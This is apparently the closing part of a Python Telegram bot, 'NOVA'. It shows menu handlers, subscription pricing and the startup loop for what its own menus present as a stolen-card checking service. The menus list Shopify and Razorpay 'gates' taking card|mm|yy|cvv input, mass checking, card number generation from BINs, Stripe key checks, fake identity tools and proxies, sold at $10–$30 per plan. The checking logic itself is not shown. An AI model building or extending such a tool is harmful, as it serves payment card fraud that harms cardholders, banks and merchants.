@client.on(events.CallbackQuery(data=b"back_cmds"))
async def cb_back_cmds(event):
    await event.answer()
    kb = [
        [pbtn(bs("🛒 Shopify Commands"), data="cmd_shopify", style="primary", icon="🛒")],
        [pbtn(bs("🔴 Razorpay Commands"), data="cmd_razorpay", style="danger", icon="🔴")],
        [pbtn(bs("🔌 Proxy Commands"),   data="cmd_proxy", style="primary", icon="🔌")],
        [pbtn(bs("🌐 Site Commands"),    data="cmd_sites", style="primary", icon="🌐")],
        [pbtn(bs("🛠️ Tools & File Commands"), data="cmd_tools", style="primary", icon="🛠️")],
        [pbtn(bs("👑 Admin Commands"),   data="cmd_admin", style="success", icon="👑")],
        [pbtn(bs("🔙 Back to Menu"),     data="main_menu", style="danger", icon="🔙")],
    ]
    await event.edit(pe(f"💎 {bs('Select a category:')}"),
                     buttons=kb, parse_mode='html', link_preview=False)


@client.on(events.CallbackQuery(data=b"main_menu"))
async def cb_main(event):
    await event.answer()
    uid = event.sender_id
    try:
        sender = await event.get_sender()
        username = sender.username or f"user_{uid}"
    except Exception:
        username = f"user_{uid}"
    if uid in ADMIN_ID: status = "👑 Admin"
    elif is_premium(uid): status = "⭐ Premium"
    else: status = "🆓 Free"
    text = pe(f"""💎 <b>{bs('NOVA')}</b>
{SEP}
👤 @{username}
🆔 <code>{uid}</code>
📊 {status}
{SEP}
🔥 {bs('Fast · Accurate · Reliable')}
💡 {bs('Use the buttons below')}
{SEP}
{DEV_LINE}""")
    try:
        await event.edit(text, buttons=main_menu_buttons(uid), parse_mode='html', link_preview=False)
    except Exception:
        pass


@client.on(events.CallbackQuery(data=b"gates_menu"))
async def cb_gates(event):
    await event.answer()
    text = pe(f"""📋 <b>{bs('User Commands')}</b>
{SEP}
🛒 <b>{bs('Shopify Gates')}</b>
└─ /sh card|mm|yy|cvv
└─ /msh (mass)
{SEP}
🔑 <b>{bs('Key System')}</b>
└─ /redeem KEY
{SEP}
📊 <b>{bs('Ranking')}</b>
└─ /rank
{SEP}
📢 <b>{bs('Forward (Premium)')}</b>
└─ /fb (reply to media)""")
    await event.edit(text, buttons=[[pbtn(bs("🔙 Back"), data="main_menu", style="danger", icon="🔙")]],
                     parse_mode='html', link_preview=False)


@client.on(events.CallbackQuery(data=b"tools_menu"))
async def cb_tools(event):
    await event.answer()
    text = pe(f"""🛠️ <b>{bs('Tools Menu')}</b>
{SEP}
🔍 <code>/bin BIN</code>
🔑 <code>/sk key</code>
🌐 <code>/scg URL</code>
💳 <code>/gen BIN [n]</code>
👤 <code>/fake CC</code>
📡 <code>/ip ip</code>
🏦 <code>/iban IBAN</code>
{SEP}
📁 <code>/split N</code> · <code>/merge</code>
📁 <code>/collect</code> · <code>/clean</code>""")
    await event.edit(text, buttons=[[pbtn(bs("🔙 Back"), data="main_menu", style="danger", icon="🔙")]],
                     parse_mode='html', link_preview=False)


@client.on(events.CallbackQuery(data=b"plans_pricing"))
async def cb_plans(event):
    await event.answer()
    text = pe(f"""<b>{PE} {bs('Plans & Pricing')}</b>

<b>{bs('Access')}</b> 💎
{SEP}
⏰ <b>{bs('Span')}</b> ━ 7 {bs('Days')}
♾️ <b>{bs('Credits')}</b> ━ {bs('Unlimited')}
💰 <b>{bs('Price')}</b> ━ $10

<b>{bs('Elite')}</b> 💎
{SEP}
⏰ <b>{bs('Span')}</b> ━ 15 {bs('Days')}
♾️ <b>{bs('Credits')}</b> ━ {bs('Unlimited')}
💰 <b>{bs('Price')}</b> ━ $15

<b>{bs('Pro')}</b> 💎
{SEP}
⏰ <b>{bs('Span')}</b> ━ 30 {bs('Days')}
♾️ <b>{bs('Credits')}</b> ━ {bs('Unlimited')}
💰 <b>{bs('Price')}</b> ━ $30

{SEP}
💡 {bs('Contact')} <a href='https://t.me/{OWNER_TAG.lstrip("@")}'>{OWNER_TAG}</a>""")
    buttons = [
        [pbtn(bs("📩 Contact Admin"), url=f"https://t.me/{OWNER_TAG.lstrip('@')}", style="success", icon="📩")],
        [pbtn(bs("🔙 Back"), data="main_menu", style="primary", icon="🔙")],
    ]
    await event.edit(text, buttons=buttons, parse_mode='html', link_preview=False)


@client.on(events.CallbackQuery(data=b"close_menu"))
async def cb_close(event):
    await event.answer()
    try:
        await event.delete()
    except Exception:
        pass


@client.on(events.CallbackQuery(data=b"admin_panel"))
async def cb_admin_panel(event):
    if event.sender_id not in ADMIN_ID:
        return await event.answer("Access denied", alert=True)
    await event.answer()
    await cb_cmd_admin(event)


@client.on(events.CallbackQuery(data=b"check_joined"))
async def cb_check_joined(event):
    uid = event.sender_id
    _JOIN_CACHE.pop(uid, None)
    if await is_user_joined(uid):
        await event.answer("✅ Verified!", alert=True)
        try:
            await event.delete()
        except Exception:
            pass
        # Send welcome menu
        try:
            sender = await event.get_sender()
            username = sender.username or "User"
        except Exception:
            username = "User"
        status_text = f"👑 {bs('Admin')}" if uid in ADMIN_ID else (f"💎 {bs('Premium')}" if is_premium(uid) else f"🆓 {bs('Free')}")
        limit_text = bs("Unlimited") if (is_premium(uid) or uid in ADMIN_ID) else "N/A cards/file"
        welcome = pe(f"""{SEP}
    ✨ {bs('Welcome to NOVA')} ✨
{SEP}
👤 {bs('User')}: @{username}
🆔 {bs('ID')}: <code>{uid}</code>
📊 {bs('Status')}: {status_text}
🎯 {bs('Limit')}: {limit_text}
{SEP}
🔥 {bs('Fast・Accurate・Zero Errors')} 🔥
📌 {bs('Use the buttons below to get started.')}
{SEP}""")
        try:
            await client_instance.send_message(
                event.chat_id, *build_entities(welcome),
                buttons=main_menu_buttons(uid), link_preview=False)
        except Exception:
            pass
    else:
        await event.answer("❌ Not joined yet", alert=True)


# ====================== BACKGROUND LOOPS ======================
async def premium_cleanup_loop():
    while True:
        await asyncio.sleep(3600)
        try:
            data = load_premium_users()
            now = datetime.now().timestamp()
            changed = False
            for uid, info in list(data.items()):
                if isinstance(info, dict):
                    exp = info.get('expiry')
                    if exp and now > float(exp):
                        del data[uid]; changed = True
            if changed:
                save_premium_users(data)
        except Exception:
            pass


# ====================== MAIN ======================
async def main():
    global client_instance
    client_instance = client
    try:
        os.makedirs(VIDEO_DIR, exist_ok=True)
    except Exception:
        pass
    log_system("BOOT", "Starting NOVA bot v4.2.0...")
    if not BOT_TOKEN:
        log_system("BOOT", "BOT_TOKEN env var not set — aborting", "error")
        return
    if not os.path.exists(PREMIUM_USERS_FILE):
        save_premium_users({str(uid): None for uid in ADMIN_ID})
    if not os.path.exists(USER_PROXIES_FILE):
        _write_json(USER_PROXIES_FILE, {})
    if not os.path.exists(KEYS_FILE):
        _write_json(KEYS_FILE, {})
    if not os.path.exists(RANK_FILE):
        _write_json(RANK_FILE, {})
    if not os.path.exists(SITES_FILE):
        open(SITES_FILE, 'a').close()
    if not os.path.exists(SETTINGS_FILE):
        save_settings({
            "maintenance": False,
            "threshold": MAX_PRODUCT_PRICE,
            "min_price": MIN_PRODUCT_PRICE,
        })
    asyncio.create_task(premium_cleanup_loop())
    while True:
        try:
            log_system("BOOT", "Connecting...")
            await client.start(bot_token=BOT_TOKEN)
            log_system("BOOT", "✅ NOVA bot online.")
            await client.run_until_disconnected()
        except FloodWaitError as e:
            log_system("FLOOD", f"Sleeping {e.seconds + 5}s", "warning")
            await asyncio.sleep(e.seconds + 5)
        except Exception as e:
            log_system("CRASH", f"{e}", "error")
            await asyncio.sleep(10)


if __name__ == "__main__":
    asyncio.run(main())
